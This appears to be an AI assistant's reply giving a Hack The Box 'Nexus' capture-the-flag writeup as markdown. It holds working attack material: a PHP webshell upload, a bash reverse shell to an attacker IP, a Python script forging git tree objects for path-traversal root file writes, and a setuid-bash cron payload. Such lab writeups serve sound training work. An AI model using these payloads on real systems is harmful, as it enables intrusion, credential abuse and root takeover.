Here's the full writeup with all instance-specific values templated (`<target_ip>`, `<attack_ip>`, `<user_flag>`, `<root_flag>`, and webshell path). I can't write files in Ask Mode, so save this block as `nexus-writeup.md` on your machine.

```markdown
# Hack The Box — Nexus (Writeup)

## Machine Info

| Field | Value |
|---|---|
| **Name** | Nexus |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Target IP** | `<target_ip>` |
| **Attack IP** | `<attack_ip>` |

## TL;DR — Attack Chain

1. Enumerate virtual hosts → find `git.nexus.htb` (Gitea) and `billing.nexus.htb` (Krayin CRM).
2. Pull a leaked password out of Gitea **git history**; pair it with an email scraped from the careers page → log into **Krayin CRM admin**.
3. Abuse the authenticated **TinyMCE upload** endpoint to upload a PHP webshell → reverse shell as `www-data`.
4. Read the runtime Laravel `.env` → real DB password → **password reuse** gets SSH as `jones` → `user.txt`.
5. Abuse a root-run **systemd timer** that syncs Gitea template repos: unsanitized `git ls-tree` paths → **path traversal arbitrary file write** as root → drop SSH key into `/root/.ssh/authorized_keys` → `root.txt`.

---

## 1. Enumeration

### 1.1 Port Scan

```bash
nmap -p- --min-rate 10000 -oA scans/alltcp <target_ip>
nmap -p 22,80 -sV -sC -oA scans/scripts <target_ip>
```

```
22/tcp open  ssh     OpenSSH 8.9p1/9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 Ubuntu
```

Only SSH and HTTP exposed. Add the host and start on the web app:

```bash
echo "<target_ip> nexus.htb" | sudo tee -a /etc/hosts
```

### 1.2 Virtual Host Fuzzing

The main site (`nexus.htb`) is a static careers page — dead end. Fuzz subdomains:

```bash
ffuf -u http://<target_ip>/ \
  -H "Host: FUZZ.nexus.htb" \
  -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 154
```

```
billing.nexus.htb   → Krayin CRM (admin panel)
git.nexus.htb       → Gitea instance
```

Add both to `/etc/hosts`:

```bash
echo "<target_ip> billing.nexus.htb git.nexus.htb" | sudo tee -a /etc/hosts
```

---

## 2. Foothold — Krayin CRM Admin

### 2.1 Leaked Credential from Git History

`git.nexus.htb` hosts a **public Gitea** instance with a public repo, e.g. `admin/krayin-docker-setup`. Clone it and mine the history:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git
cd krayin-docker-setup
git log --oneline --all
git diff HEAD~1 HEAD
git grep -nE 'password|secret|token|APP_KEY|DB_PASSWORD' $(git rev-list --all)
```

An old commit contains a password that a later commit tried (and failed) to redact — Git history never forgets. Pair it with an email found on the main site's **careers page** (`j.matthew@nexus.htb`) → **password reuse** gets you into Krayin as admin:

```bash
PASS='<password_from_git_history>'
EMAIL='j.matthew@nexus.htb'

curl -c loot/auth.cookie -s http://billing.nexus.htb/admin/login -o loot/login.html
TOKEN=$(grep -oP 'name="_token" value="\K[^"]+' loot/login.html)

curl -s -i -b loot/auth.cookie -c loot/auth.cookie \
  -X POST http://billing.nexus.htb/admin/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASS" \
  --data-urlencode "_token=$TOKEN"
```

### 2.2 TinyMCE Upload → Webshell

Krayin's WYSIWYG editor (TinyMCE) has an authenticated upload endpoint that trusts the **client-controlled filename/extension**. Upload a PHP webshell masquerading as an image:

```bash
cat > /tmp/shell.php <<'EOF'
<?php system($_GET['cmd'] ?? 'id'); ?>
EOF

curl -s -i -b loot/auth.cookie -c loot/auth.cookie \
  -F "_token=$TOKEN" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  http://billing.nexus.htb/admin/tinymce/upload | tee loot/upload.txt
```

The response reveals the stored path, e.g. `<webshell_path>`. Confirm RCE:

```bash
curl --get "http://billing.nexus.htb<webshell_path>" \
  --data-urlencode "cmd=id"
```

### 2.3 Reverse Shell as `www-data`

```bash
# attacker
nc -lvnp 4444

# via webshell
curl --get "http://billing.nexus.htb<webshell_path>" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attack_ip>/4444 0>&1'"
```

```bash
www-data@nexus:/var/www/krayin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 3. Lateral Movement — `www-data` → `jones`

The Laravel app directory is readable. The runtime `.env` holds the **production** DB password — much more valuable than the redacted one:

```bash
cat /var/www/krayin/.env
```

```
DB_USERNAME=krayin
DB_PASSWORD=<db_password>
```

Test **password reuse** over SSH — the `jones` account (same person whose email got you into the CRM):

```bash
ssh jones@<target_ip>    # <db_password>
```

```bash
jones@nexus:~$ id
uid=1000(jones) gid=1000(jones) groups=1000(jones)
jones@nexus:~$ cat user.txt
<user_flag>
```

---

## 4. Privilege Escalation — `jones` → `root`

### 4.1 Discovery

Check for unusual timers/services (or watch with `pspy`):

```bash
systemctl list-timers --all
systemctl cat gitea-template-sync.timer
systemctl cat gitea-template-sync.service
sed -n '1,260p' /etc/gitea/template-sync.py
```

A **root-owned systemd timer** runs `template-sync.py` every minute. It:

- queries Gitea for repos marked as **templates**,
- runs `git ls-tree -r HEAD` on each,
- writes every blob to a staging dir: `target = os.path.join(stage_path, filepath)`.

The bug: `filepath` comes straight from `git ls-tree` with **no `..` sanitization** and no canonical-path check. Since the script runs as `root`, a crafted tree entry = **arbitrary root file write**.

### 4.2 Crafting the Malicious Git Tree

Git's CLI refuses `..` in tree paths, so we write the **raw git object** (zlib-compressed `<type> <size>\x00<content>`) directly into the object store and push it. The blob's content is our SSH public key, and the tree entry is:

```
../../../../../root/.ssh/authorized_keys
```

which resolves from `/home/git/template-staging/jones/ssh/` straight into `/root/.ssh/authorized_keys`.

```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, base64

GITEA_URL = "http://127.0.0.1:3000"      # port-forwarded
USER, PASS = "jones", "<db_password>"
REPO   = "ssh"
PUBKEY = "/tmp/root_key.pub"
TRAVERSAL = b"../../../../../root/.ssh/authorized_keys"
WORKDIR = "/tmp/git-payload"

os.makedirs(WORKDIR, exist_ok=True)
subprocess.run(["git", "init", "-q"], cwd=WORKDIR)

def write_git_object(kind, data):
    raw  = kind.encode() + b" " + str(len(data)).encode() + b"\x00" + data
    sha1 = hashlib.sha1(raw).hexdigest()
    path = os.path.join(WORKDIR, ".git", "objects", sha1[:2], sha1[2:])
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(zlib.compress(raw))
    return sha1

with open(PUBKEY, "rb") as f:
    blob = write_git_object("blob", f.read())
print(f"[+] Blob: {blob}")

entry = b"100644 " + TRAVERSAL + b"\x00" + bytes.fromhex(blob)
tree  = write_git_object("tree", entry)
print(f"[+] Tree: {tree}")

env = {**os.environ, "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@a.com",
       "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@a.com"}
commit = subprocess.run(["git", "commit-tree", tree, "-m", "init"],
                        cwd=WORKDIR, capture_output=True, text=True, env=env).stdout.strip()
print(f"[+] Commit: {commit}")

auth = base64.b64encode(f"{USER}:{PASS}".encode()).decode()
subprocess.run(["git", "-c", f"http.extraHeader=Authorization: Basic {auth}",
                "push", "-f", f"{GITEA_URL}/{USER}/{REPO}.git",
                f"{commit}:refs/heads/main"], cwd=WORKDIR)
```

Steps before pushing:

1. As `jones`, create repo `ssh` in Gitea and mark it **Template Repository** (this is what the sync script's API query picks up).
2. Generate a keypair on the target and save the pubkey locally:
   ```bash
   jones@nexus:~$ ssh-keygen -f /tmp/root_key -N ''
   ```
3. Run the exploit script, then **wait ≤ 60 s** for the timer.

### 4.3 Root

```bash
chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@<target_ip>
```

```bash
root@nexus:~# id
uid=0(root) gid=0(root) groups=0(root)
root@nexus:~# cat root.txt
<root_flag>
```

> **Alternate payload:** instead of `authorized_keys`, some instances write a cron file:
> ```bash
> PAYLOAD='* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
> ```
> pushed as `../../../../../etc/cron.d/nexus`, then `/tmp/rootbash -p` for euid=0.

--- 

## 5. Key Takeaways

- **Fuzz vhosts** on every HTB web box — the main domain is often a decoy.
- **Git history is forever.** `git log --all` + `git grep $(git rev-list --all)` finds "deleted" secrets.
- **Runtime `.env` files** beat leaked/redacted ones — always check post-exploitation.
- **Authenticated file uploads** are still high-risk; never trust client-supplied filenames/extensions.
- **Password reuse** ties together web app, DB, and OS accounts.
- **Custom systemd timers/scripts run as root are the intended privesc** — audit them for path handling.
- Validate file paths with **canonical paths** before writing (the fix for `template-sync.py`).
